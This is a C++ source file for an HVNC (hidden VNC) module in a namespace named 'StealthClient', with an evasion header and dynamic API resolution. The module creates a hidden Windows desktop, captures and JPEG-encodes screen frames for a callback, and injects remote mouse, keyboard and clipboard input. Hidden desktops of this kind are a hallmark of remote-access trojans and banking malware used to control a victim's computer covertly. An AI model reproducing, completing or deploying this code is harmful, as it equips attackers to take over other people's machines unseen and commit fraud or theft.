#include "hvnc_handler.h"
#include "json_utils.h"
#include "core/evasion/dynamic_api.h"
#include "json.hpp"
#include <windows.h>
#include <gdiplus.h>
#include <iostream>
#include <chrono>
#include <algorithm>
#include <sstream>
#include <iomanip>
#include <comdef.h>
#include <shlobj.h>
#include <vector>
#include <cstring>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "user32.lib")

using namespace Gdiplus;
using namespace std::chrono;

namespace StealthClient {

// GDI+ initialization
static ULONG_PTR gdiplusToken = 0;
static bool gdiplusInitialized = false;

static void InitializeGDI() {
    if (!gdiplusInitialized) {
        GdiplusStartupInput gdiplusStartupInput;
        GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);
        gdiplusInitialized = true;
    }
}

static void ShutdownGDI() {
    if (gdiplusInitialized) {
        GdiplusShutdown(gdiplusToken);
        gdiplusInitialized = false;
    }
}

HvncHandler::HvncHandler()
    : m_active(false)
    , m_captureRunning(false)
    , m_hiddenDesktop(nullptr)
    , m_originalDesktop(nullptr)
    , m_jpegQuality(75)
    , m_targetFPS(15)
    , m_actualFPS(0)
    , m_screenWidth(1920)
    , m_screenHeight(1080)
    , m_totalFrames(0)
    , m_droppedFrames(0)
{
    InitializeGDI();
    
    // Get screen dimensions
    m_screenWidth = GetSystemMetrics(SM_CXSCREEN);
    m_screenHeight = GetSystemMetrics(SM_CYSCREEN);
}

HvncHandler::~HvncHandler() {
    Stop();
    ShutdownGDI();
}

bool HvncHandler::Start(const std::string& sessionId, const HvncSettings& settings) {
    if (m_active) {
        std::cout << "[HVNC] Session already active" << std::endl;
        return false;
    }
    
    m_sessionId = sessionId;
    m_settings = settings;
    m_jpegQuality = GetQualityValue(settings.quality);
    m_targetFPS = settings.fps;
    
    std::cout << "[HVNC] Starting session: " << sessionId << std::endl;
    std::cout << "[HVNC] Quality: " << settings.quality << " (JPEG: " << m_jpegQuality << ")" << std::endl;
    std::cout << "[HVNC] FPS: " << m_targetFPS << std::endl;
    
    // Create hidden desktop
    if (!CreateHiddenDesktop()) {
        std::cerr << "[HVNC] Failed to create hidden desktop" << std::endl;
        return false;
    }
    
    // Start capture thread
    m_active = true;
    m_captureRunning = true;
    m_lastFrameTime = steady_clock::now();
    m_totalFrames = 0;
    m_droppedFrames = 0;
    
    m_captureThread = std::make_unique<std::thread>(&HvncHandler::CaptureThread, this);
    
    std::cout << "[HVNC] Session started successfully" << std::endl;
    return true;
}

void HvncHandler::Stop() {
    if (!m_active) {
        return;
    }
    
    std::cout << "[HVNC] Stopping session: " << m_sessionId << std::endl;
    
    m_active = false;
    m_captureRunning = false;
    
    // Notify capture thread
    m_frameCondition.notify_all();
    
    // Wait for capture thread
    if (m_captureThread && m_captureThread->joinable()) {
        m_captureThread->join();
        m_captureThread.reset();
    }
    
    // Destroy hidden desktop
    DestroyHiddenDesktop();
    
    std::cout << "[HVNC] Session stopped. Frames: " << m_totalFrames << ", Dropped: " << m_droppedFrames << std::endl;
}

bool HvncHandler::CreateHiddenDesktop() {
    // Get current desktop
    m_originalDesktop = GetThreadDesktop(GetCurrentThreadId());
    
    // Create hidden desktop with random name
    std::string desktopName = "HVNC_" + m_sessionId.substr(0, 8);
    
    // Use dynamic API resolution for CreateDesktop
    auto CreateDesktopFunc = reinterpret_cast<HDESK(WINAPI*)(LPSTR, DWORD, LPDEVMODEA, DWORD, ACCESS_MASK, LPSECURITY_ATTRIBUTES)>(
        GetProcAddress(GetModuleHandleA("user32.dll"), "CreateDesktopA")
    );
    
    if (!CreateDesktopFunc) {
        std::cerr << "[HVNC] Failed to get CreateDesktop function" << std::endl;
        return false;
    }
    
    m_hiddenDesktop = CreateDesktopFunc(
        const_cast<LPSTR>(desktopName.c_str()),
        nullptr,
        nullptr,
        0,
        DESKTOP_ALL_ACCESS,
        nullptr
    );
    
    if (!m_hiddenDesktop) {
        std::cerr << "[HVNC] Failed to create hidden desktop. Error: " << GetLastError() << std::endl;
        return false;
    }
    
    std::cout << "[HVNC] Hidden desktop created: " << desktopName << std::endl;
    return true;
}

void HvncHandler::DestroyHiddenDesktop() {
    if (m_hiddenDesktop) {
        // Switch back to original desktop
        if (m_originalDesktop) {
            SetThreadDesktop(m_originalDesktop);
        }
        
        // Close desktop handle
        CloseDesktop(m_hiddenDesktop);
        m_hiddenDesktop = nullptr;
        
        std::cout << "[HVNC] Hidden desktop destroyed" << std::endl;
    }
}

bool HvncHandler::SwitchToHiddenDesktop() {
    if (!m_hiddenDesktop) {
        return false;
    }
    
    return SetThreadDesktop(m_hiddenDesktop) != FALSE;
}

void HvncHandler::CaptureThread() {
    std::cout << "[HVNC] Capture thread started" << std::endl;
    
    const auto frameInterval = milliseconds(1000 / m_targetFPS);
    auto nextFrameTime = steady_clock::now();
    
    while (m_captureRunning) {
        auto currentTime = steady_clock::now();
        
        // Check if it's time for next frame
        if (currentTime >= nextFrameTime) {
            FrameData frame;
            
            if (CaptureFrame(frame)) {
                // Encode frame
                std::vector<uint8_t> encoded;
                if (EncodeFrameJPEG(frame, encoded, m_jpegQuality)) {
                    // Send frame via callback
                    if (m_frameCallback) {
                        FrameData encodedFrame;
                        encodedFrame.data = encoded;
                        encodedFrame.width = frame.width;
                        encodedFrame.height = frame.height;
                        encodedFrame.size = encoded.size();
                        
                        m_frameCallback(encodedFrame, m_sessionId);
                    }
                    
                    m_totalFrames++;
                    CalculateFrameRate();
                } else {
                    m_droppedFrames++;
                }
            } else {
                m_droppedFrames++;
            }
            
            nextFrameTime = currentTime + frameInterval;
        } else {
            // Sleep until next frame time
            std::this_thread::sleep_for(milliseconds(1));
        }
    }
    
    std::cout << "[HVNC] Capture thread stopped" << std::endl;
}

bool HvncHandler::CaptureFrame(FrameData& frame) {
    // Try DXGI first (hardware accelerated), fallback to GDI
    if (CaptureFrameDXGI(frame)) {
        return true;
    }
    
    return CaptureFrameGDI(frame);
}

bool HvncHandler::CaptureFrameGDI(FrameData& frame) {
    HDC hScreenDC = GetDC(nullptr);
    if (!hScreenDC) {
        return false;
    }
    
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    if (!hMemoryDC) {
        ReleaseDC(nullptr, hScreenDC);
        return false;
    }
    
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, m_screenWidth, m_screenHeight);
    if (!hBitmap) {
        DeleteDC(hMemoryDC);
        ReleaseDC(nullptr, hScreenDC);
        return false;
    }
    
    SelectObject(hMemoryDC, hBitmap);
    BitBlt(hMemoryDC, 0, 0, m_screenWidth, m_screenHeight, hScreenDC, 0, 0, SRCCOPY);
    
    // Convert to GDI+ Bitmap
    Bitmap bitmap(hBitmap, nullptr);
    
    // Get bitmap data
    BitmapData bitmapData;
    Rect rect(0, 0, m_screenWidth, m_screenHeight);
    
    if (bitmap.LockBits(&rect, ImageLockModeRead, PixelFormat24bppRGB, &bitmapData) == Ok) {
        // Allocate frame buffer
        frame.width = m_screenWidth;
        frame.height = m_screenHeight;
        frame.data.resize(m_screenWidth * m_screenHeight * 3);
        
        // Copy pixel data
        uint8_t* src = static_cast<uint8_t*>(bitmapData.Scan0);
        uint8_t* dst = frame.data.data();
        
        for (int y = 0; y < m_screenHeight; y++) {
            memcpy(dst + y * m_screenWidth * 3, src + y * bitmapData.Stride, m_screenWidth * 3);
        }
        
        bitmap.UnlockBits(&bitmapData);
    }
    
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(nullptr, hScreenDC);
    
    return !frame.data.empty();
}

bool HvncHandler::CaptureFrameDXGI(FrameData& frame) {
    // DXGI Desktop Duplication API implementation would go here
    // For now, fallback to GDI
    return false;
}

int HvncHandler::GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0;
    UINT size = 0;
    
    GetImageEncodersSize(&num, &size);
    if (size == 0) {
        return -1;
    }
    
    ImageCodecInfo* pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (!pImageCodecInfo) {
        return -1;
    }
    
    GetImageEncoders(num, size, pImageCodecInfo);
    
    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }
    
    free(pImageCodecInfo);
    return -1;
}

bool HvncHandler::EncodeFrameJPEG(const FrameData& frame, std::vector<uint8_t>& encoded, int quality) {
    if (frame.data.empty()) {
        return false;
    }
    
    // Create GDI+ Bitmap from frame data
    Bitmap bitmap(frame.width, frame.height, PixelFormat24bppRGB);
    
    BitmapData bitmapData;
    Rect rect(0, 0, frame.width, frame.height);
    
    if (bitmap.LockBits(&rect, ImageLockModeWrite, PixelFormat24bppRGB, &bitmapData) == Ok) {
        uint8_t* dst = static_cast<uint8_t*>(bitmapData.Scan0);
        const uint8_t* src = frame.data.data();
        
        for (int y = 0; y < frame.height; y++) {
            memcpy(dst + y * bitmapData.Stride, src + y * frame.width * 3, frame.width * 3);
        }
        
        bitmap.UnlockBits(&bitmapData);
    }
    
    // Encode to JPEG
    CLSID jpegClsid;
    if (GetEncoderClsid(L"image/jpeg", &jpegClsid) < 0) {
        return false;
    }
    
    EncoderParameters encoderParams;
    encoderParams.Count = 1;
    encoderParams.Parameter[0].Guid = EncoderQuality;
    encoderParams.Parameter[0].Type = EncoderParameterValueTypeLong;
    encoderParams.Parameter[0].NumberOfValues = 1;
    encoderParams.Parameter[0].Value = &quality;
    
    // Save to IStream
    IStream* stream = nullptr;
    CreateStreamOnHGlobal(nullptr, TRUE, &stream);
    
    if (bitmap.Save(stream, &jpegClsid, &encoderParams) == Ok) {
        // Get stream size
        STATSTG stat;
        stream->Stat(&stat, STATFLAG_NONAME);
        
        // Read stream data
        encoded.resize(stat.cbSize.LowPart);
        LARGE_INTEGER li = {0};
        stream->Seek(li, STREAM_SEEK_SET, nullptr);
        ULONG bytesRead = 0;
        stream->Read(encoded.data(), encoded.size(), &bytesRead);
        
        stream->Release();
        return true;
    }
    
    if (stream) {
        stream->Release();
    }
    
    return false;
}

bool HvncHandler::HandleCommand(const std::string& command, const std::string& params) {
    if (!m_active) {
        return false;
    }
    
    // Parse params JSON
    nlohmann::json paramsJson;
    try {
        paramsJson = nlohmann::json::parse(params);
    } catch (...) {
        std::cerr << "[HVNC] Failed to parse command params" << std::endl;
        return false;
    }
    
    if (command == "mouse_move" || command == "mouse_down" || command == "mouse_up" || command == "mouse_drag") {
        int x = paramsJson.value("x", 0);
        int y = paramsJson.value("y", 0);
        std::string button = paramsJson.value("button", "left");
        int deltaX = paramsJson.value("deltaX", 0);
        int deltaY = paramsJson.value("deltaY", 0);
        
        return SendMouseInput(x, y, command, button, deltaX, deltaY);
    }
    else if (command == "mouse_scroll") {
        int x = paramsJson.value("x", 0);
        int y = paramsJson.value("y", 0);
        int deltaY = paramsJson.value("deltaY", 0);
        
        return SendMouseInput(x, y, "scroll", "middle", 0, deltaY);
    }
    else if (command == "key_down" || command == "key_up") {
        std::string key = paramsJson.value("key", "");
        int keyCode = paramsJson.value("keyCode", 0);
        bool shift = paramsJson.value("shiftKey", false);
        bool ctrl = paramsJson.value("ctrlKey", false);
        bool alt = paramsJson.value("altKey", false);
        bool meta = paramsJson.value("metaKey", false);
        
        return SendKeyboardInput(command, key, keyCode, shift, ctrl, alt, meta);
    }
    else if (command == "clipboard_set") {
        std::string text = paramsJson.value("text", "");
        return SendClipboardInput(text);
    }
    
    return false;
}

bool HvncHandler::SendMouseInput(int x, int y, const std::string& action, const std::string& button, int deltaX, int deltaY) {
    INPUT input = {0};
    input.type = INPUT_MOUSE;
    
    DWORD flags = 0;
    if (action == "mouse_down") {
        if (button == "left") flags = MOUSEEVENTF_LEFTDOWN;
        else if (button == "right") flags = MOUSEEVENTF_RIGHTDOWN;
        else if (button == "middle") flags = MOUSEEVENTF_MIDDLEDOWN;
    }
    else if (action == "mouse_up") {
        if (button == "left") flags = MOUSEEVENTF_LEFTUP;
        else if (button == "right") flags = MOUSEEVENTF_RIGHTUP;
        else if (button == "middle") flags = MOUSEEVENTF_MIDDLEUP;
    }
    else if (action == "mouse_move" || action == "mouse_drag") {
        flags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE;
        input.mi.dx = (x * 65535) / m_screenWidth;
        input.mi.dy = (y * 65535) / m_screenHeight;
    }
    else if (action == "scroll") {
        flags = MOUSEEVENTF_WHEEL;
        input.mi.mouseData = deltaY;
    }
    
    input.mi.dwFlags = flags;
    
    return SendInput(1, &input, sizeof(INPUT)) == 1;
}

bool HvncHandler::SendKeyboardInput(const std::string& action, const std::string& key, int keyCode, bool shift, bool ctrl, bool alt, bool meta) {
    INPUT inputs[4] = {0};
    int inputCount = 0;
    
    // Modifier keys
    if (shift) {
        inputs[inputCount].type = INPUT_KEYBOARD;
        inputs[inputCount].ki.wVk = VK_SHIFT;
        inputs[inputCount].ki.dwFlags = (action == "key_down") ? 0 : KEYEVENTF_KEYUP;
        inputCount++;
    }
    if (ctrl) {
        inputs[inputCount].type = INPUT_KEYBOARD;
        inputs[inputCount].ki.wVk = VK_CONTROL;
        inputs[inputCount].ki.dwFlags = (action == "key_down") ? 0 : KEYEVENTF_KEYUP;
        inputCount++;
    }
    if (alt) {
        inputs[inputCount].type = INPUT_KEYBOARD;
        inputs[inputCount].ki.wVk = VK_MENU;
        inputs[inputCount].ki.dwFlags = (action == "key_down") ? 0 : KEYEVENTF_KEYUP;
        inputCount++;
    }
    
    // Main key
    inputs[inputCount].type = INPUT_KEYBOARD;
    inputs[inputCount].ki.wVk = (keyCode > 0) ? keyCode : VkKeyScanA(key[0]) & 0xFF;
    inputs[inputCount].ki.dwFlags = (action == "key_down") ? 0 : KEYEVENTF_KEYUP;
    inputCount++;
    
    return SendInput(inputCount, inputs, sizeof(INPUT)) == inputCount;
}

bool HvncHandler::SendClipboardInput(const std::string& text) {
    if (OpenClipboard(nullptr)) {
        EmptyClipboard();
        HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, text.size() + 1);
        if (hMem) {
            memcpy(GlobalLock(hMem), text.c_str(), text.size() + 1);
            GlobalUnlock(hMem);
            SetClipboardData(CF_TEXT, hMem);
        }
        CloseClipboard();
        return true;
    }
    return false;
}

int HvncHandler::GetQualityValue(const std::string& quality) const {
    if (quality == "high") return 90;
    if (quality == "medium") return 75;
    if (quality == "low") return 50;
    return 75;
}

void HvncHandler::CalculateFrameRate() {
    auto currentTime = steady_clock::now();
    auto elapsed = duration_cast<milliseconds>(currentTime - m_lastFrameTime).count();
    
    if (elapsed >= 1000) {
        m_actualFPS = (m_totalFrames * 1000) / elapsed;
        m_lastFrameTime = currentTime;
        m_totalFrames = 0;
    }
}

void HvncHandler::SetFrameCallback(std::function<void(const FrameData&, const std::string&)> callback) {
    m_frameCallback = callback;
}

void HvncHandler::SetSendMessageCallback(std::function<void(const std::string&)> callback) {
    m_sendMessageCallback = callback;
}

} // namespace StealthClient
